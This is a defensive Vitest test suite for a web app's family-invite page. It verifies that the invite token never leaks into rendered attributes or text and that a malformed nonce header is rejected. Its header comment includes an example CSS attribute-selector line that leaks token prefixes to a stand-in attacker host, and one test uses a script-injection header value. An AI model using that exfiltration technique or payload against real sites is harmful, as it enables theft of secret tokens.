// @vitest-environment jsdom

import type { ReactNode } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { beforeEach, describe, expect, it, vi } from "vitest";

/**
 * #2827 — the invite token must not reach a rendered attribute on the
 * family-invite page.
 *
 * The page used to build its sign-in link as
 * `buildLoginPath('/family-invite/<token>')`, which put the token in an `href` and
 * so in the visitor's address bar, history and `Referer`. The signed-out branch is
 * a plain `/login` anchor now, and the post-login return address travels in the
 * HttpOnly cookie `src/lib/family-invite-return-address.ts` documents.
 *
 * **The threat this file is named after is not the one that was live here, and the
 * distinction was a review finding (20 Aug 2026).** A CSS attribute selector reads
 * a value one character at a time —
 *
 *     a[href^="/family-invite/e7c1b9"] { background: url(https://attacker/e7c1b9); }
 *
 * — and that oracle IS live on the `(website-dynamic)` group, whose chrome injects
 * `theme.css` with admin Raw CSS appended. This is a `(public)` route, and
 * `(public)/layout.tsx` injects `theme.appCss`, which excludes `rawCss` by design.
 * So these assertions are defence in depth: they hold the line for the day this
 * group moves under the shared chrome (as #2818 moved `(website-dynamic)`), and
 * they pin the URL/history exposure that WAS real, closed.
 *
 * Two branches are covered: the signed-out branch, and the wrong-account branch a
 * signed-in visitor reaches when the invite was sent to somebody else. The
 * wrong-account branch matters independently — it is the one a forwarded link lands
 * on, so it is the one an attacker can reach with a session of their own.
 *
 * **#2974 puts something new in that anchor, and the cases below say exactly what.**
 * The sign-in link is `/login?inviteReturn=<nonce>`: 128 random bits the proxy
 * minted on this response, which bind the return address to this tab so the next
 * person to sign in on a shared kiosk browser is not landed on this invitation. It
 * is not derived from the token and it is worth nothing without the HttpOnly cookie
 * from the same browser, so it reintroduces no oracle — and the token assertions
 * here are unchanged and still pass, which is the point.
 */

/** A realistic 64-hex action token, with no repeating run, so a short prefix of
 * it is distinctive enough that finding one in an attribute means a real leak
 * rather than a coincidental class-name collision. */
const TOKEN =
  "e7c1b93a5d0f4826" + "1af74c02be95d738" + "6b0d2e8149a3fc57" + "d4938e6017c2ba5f";

/** The shortest prefix an attacker needs to start a working `^=` oracle. */
const ORACLE_PROBE_LENGTH = 6;

/** A #2974 tab-binding nonce, as `src/proxy.ts` would have minted it. */
const NONCE = "3f9c17ae42b0d85610c73fe29ab4d051";

const { mockAuth, mockInviteView, mockMemberFindUnique, mockRequestHeaders } =
  vi.hoisted(() => ({
    mockAuth: vi.fn(),
    mockInviteView: vi.fn(),
    mockMemberFindUnique: vi.fn(),
    mockRequestHeaders: vi.fn<() => Headers>(),
  }));

// #2974: the page reads the tab-binding nonce out of the request header the proxy
// set on this very response. Mocked at `next/headers` because `headers()` throws
// outside a request scope.
vi.mock("next/headers", () => ({
  headers: async () => mockRequestHeaders(),
}));

vi.mock("@/lib/auth", () => ({ auth: () => mockAuth() }));

vi.mock("@/lib/partner-invite-token", () => ({
  getPartnerInviteTokenForClaim: (token: string) => mockInviteView(token),
}));

vi.mock("@/lib/prisma", () => ({
  prisma: {
    member: { findUnique: (...args: unknown[]) => mockMemberFindUnique(...args) },
  },
}));

vi.mock("@/lib/public-layout-config", () => ({
  getCachedClubIdentity: async () => ({ name: "Test Alpine Club" }),
}));

// The sign-out affordance's own dependency, stubbed so the REAL component still
// renders here — its markup is part of what this suite measures.
vi.mock("next-auth/react", () => ({ signOut: vi.fn() }));

vi.mock("next/link", () => ({
  default: ({ href, children, ...rest }: { href: unknown; children: ReactNode }) => (
    <a href={String(href)} {...rest}>
      {children}
    </a>
  ),
}));

// The claim card is a client component with its own suite; render it as a marker
// so this suite measures the page's own markup. It legitimately receives the
// token as a prop — see the last case for why that is not the same exposure.
vi.mock("@/components/partner-invite-claim-card", () => ({
  PartnerInviteClaimCard: () => <div data-testid="claim-card" />,
}));

import PartnerInvitePage from "../page";

function claimableView(overrides: Record<string, unknown> = {}) {
  return {
    status: "claimable",
    invitedEmail: "invited@example.com",
    groupName: "The Smiths",
    familyGroupId: "fg-1",
    createPartnerLink: false,
    inviterName: "Jo Smith",
    ...overrides,
  };
}

async function renderPage() {
  const markup = renderToStaticMarkup(
    await PartnerInvitePage({ params: Promise.resolve({ token: TOKEN }) }),
  );
  const host = document.createElement("div");
  host.innerHTML = markup;
  return { markup, host };
}

/** Every attribute value in the rendered tree, root element included. */
function everyAttributeValue(root: Element): { name: string; value: string }[] {
  const elements = [root, ...Array.from(root.querySelectorAll("*"))];
  return elements.flatMap((element) =>
    Array.from(element.attributes).map((attribute) => ({
      name: `<${element.tagName.toLowerCase()} ${attribute.name}>`,
      value: attribute.value,
    })),
  );
}

function expectNoTokenAnywhere(markup: string, host: Element) {
  const probe = TOKEN.slice(0, ORACLE_PROBE_LENGTH);

  for (const attribute of everyAttributeValue(host)) {
    // Asserted on the PREFIX, not the whole token: exfiltration is
    // prefix-by-prefix, so an attribute holding the first few characters already
    // hands an attacker a working `^=` oracle to extend.
    expect(attribute.value, `${attribute.name} carries the invite token`).not.toContain(
      probe,
    );
  }

  expect(markup).not.toContain(TOKEN);
  expect(markup).not.toContain(encodeURIComponent(TOKEN));
  expect(host.textContent ?? "").not.toContain(probe);
}

beforeEach(() => {
  vi.clearAllMocks();
  mockInviteView.mockResolvedValue(claimableView());
  mockRequestHeaders.mockReturnValue(
    new Headers({ "x-family-invite-return-nonce": NONCE }),
  );
});

describe("family-invite page — the invite token stays out of the markup (#2827)", () => {
  it("offers a signed-out visitor a plain /login link with no callbackUrl", async () => {
    mockAuth.mockResolvedValue(null);

    const { host } = await renderPage();
    const signIn = Array.from(host.querySelectorAll("a")).find((anchor) =>
      (anchor.textContent ?? "").includes("I already have an account"),
    );

    expect(signIn, "the sign-in affordance must survive the fix").toBeTruthy();
    // Exact, not a prefix match: `/login?callbackUrl=…` is the shape this fix
    // removes and the shape a future edit would most plausibly reintroduce. The
    // only query parameter permitted here is the #2974 tokenless nonce.
    expect(signIn?.getAttribute("href")).toBe(`/login?inviteReturn=${NONCE}`);
  });

  it("carries the tokenless tab-binding nonce, and nothing derived from the token (#2974)", async () => {
    // The nonce is what stops the next person signing in on a shared kiosk browser
    // from landing on this invitation. It goes in an `href`, so it has to be worth
    // nothing to a CSS attribute oracle: it is random, not derived, and useless
    // without the HttpOnly cookie from the same browser.
    mockAuth.mockResolvedValue(null);

    const { markup, host } = await renderPage();
    const signIn = Array.from(host.querySelectorAll("a")).find((anchor) =>
      (anchor.textContent ?? "").includes("I already have an account"),
    );

    expect(signIn?.getAttribute("href")).toContain(`inviteReturn=${NONCE}`);
    expect(NONCE).not.toContain(TOKEN.slice(0, ORACLE_PROBE_LENGTH));
    // Belt and braces: the nonce being present must not have smuggled the token in.
    expectNoTokenAnywhere(markup, host);
  });

  it("falls back to a plain /login when the proxy sent no nonce (#2974)", async () => {
    // A browser too old for `Sec-Fetch-*`, or any request the proxy declined to
    // write an address for. The recipient signs in normally and lands where they
    // usually would; nothing errors, and the emailed link still works.
    mockAuth.mockResolvedValue(null);
    mockRequestHeaders.mockReturnValue(new Headers());

    const { host } = await renderPage();
    const signIn = Array.from(host.querySelectorAll("a")).find((anchor) =>
      (anchor.textContent ?? "").includes("I already have an account"),
    );

    expect(signIn?.getAttribute("href")).toBe("/login");
  });

  it("refuses a malformed nonce rather than putting it in the anchor (#2974)", async () => {
    // The header is deleted on every request before the proxy sets its own, so a
    // forged value should never arrive — this is the second lock on that door.
    mockAuth.mockResolvedValue(null);
    mockRequestHeaders.mockReturnValue(
      new Headers({ "x-family-invite-return-nonce": `"><script>x</script>` }),
    );

    const { host } = await renderPage();
    const signIn = Array.from(host.querySelectorAll("a")).find((anchor) =>
      (anchor.textContent ?? "").includes("I already have an account"),
    );

    expect(signIn?.getAttribute("href")).toBe("/login");
  });

  it("puts the token in NO attribute and no visible text when signed out", async () => {
    mockAuth.mockResolvedValue(null);

    const { markup, host } = await renderPage();

    expectNoTokenAnywhere(markup, host);
  });

  it("keeps it a real anchor, so the flow survives with JavaScript off", async () => {
    // The owner's requirement for this rework. A button with an onClick handler
    // would have closed the oracle and quietly dropped the no-JavaScript path;
    // an anchor to a static address needs no script at all, and BOTH halves of the
    // #2974 binding — the cookie and the nonce in this href — ride on the response
    // that rendered it. Nothing on this page needs scripting to arm the return
    // address.
    mockAuth.mockResolvedValue(null);

    const { host } = await renderPage();
    const signIn = Array.from(host.querySelectorAll("a")).find((anchor) =>
      (anchor.textContent ?? "").includes("I already have an account"),
    );

    expect(signIn?.tagName).toBe("A");
    expect(signIn?.getAttribute("href")).toBeTruthy();
  });

  it("does the same on the wrong-account branch a forwarded link reaches", async () => {
    mockAuth.mockResolvedValue({ user: { id: "member-1" } });
    mockMemberFindUnique.mockResolvedValue({ email: "someone.else@example.com" });

    const { markup, host } = await renderPage();

    expectNoTokenAnywhere(markup, host);
  });

  it("gives the wrong-account branch a control that is not a bounce to /login", async () => {
    // Review finding, 20 Aug 2026. This branch is reached BY a signed-in visitor,
    // and `(public)/login/page.tsx` redirects an authenticated visitor straight
    // back to their resolved landing — which, with the #2827 cookie at precedence
    // 2, is this very page. So a `<Link href="/login">` here (and the pre-#2827
    // `buildLoginPath(...)` link before it) bounced the visitor to the identical
    // screen, with no sign-out affordance anywhere on a `(public)` page to reach
    // instead. The control signs them out and returns them here.
    mockAuth.mockResolvedValue({ user: { id: "member-1" } });
    mockMemberFindUnique.mockResolvedValue({ email: "someone.else@example.com" });

    const { host } = await renderPage();

    expect(
      Array.from(host.querySelectorAll("a")).map((anchor) =>
        anchor.getAttribute("href"),
      ),
      "no anchor on this branch may point at /login — that is the bounce",
    ).not.toContainEqual(expect.stringContaining("/login"));
    const control = Array.from(host.querySelectorAll("button")).find((button) =>
      (button.textContent ?? "").includes("Sign out and use a different account"),
    );

    expect(control, "the branch must offer a working way out").toBeTruthy();
    // The real component, not a stub: it is what holds the return path, so this is
    // also what makes `expectNoTokenAnywhere` above meaningful for this branch.
    expect(control?.tagName).toBe("BUTTON");
  });

  it("still refuses the wrong signed-in email — the check this fix does not replace", async () => {
    // Defence in depth, and load-bearing for the cookie's threat model: a value
    // planted by an attacker, or left in a shared browser, can only land somebody
    // on an invite page. This is what stops them joining the group from there.
    mockAuth.mockResolvedValue({ user: { id: "member-1" } });
    mockMemberFindUnique.mockResolvedValue({ email: "someone.else@example.com" });

    const { host } = await renderPage();

    expect(host.textContent).toContain("This invitation was sent to");
    expect(host.querySelector('[data-testid="claim-card"]')).toBeNull();
  });

  it("admits the invited member, whose claim card legitimately holds the token", async () => {
    // The matching-email branch is the one authorised visitor, and the claim card
    // is a client component that needs the token to POST the claim. That is a
    // React prop in the flight payload, not a rendered attribute, so no CSS
    // selector can read it — which is why this suite asserts on attributes and
    // text rather than on the whole document.
    mockAuth.mockResolvedValue({ user: { id: "member-1" } });
    mockMemberFindUnique.mockResolvedValue({ email: "invited@example.com" });

    const { host } = await renderPage();

    expect(host.querySelector('[data-testid="claim-card"]')).not.toBeNull();
  });
});
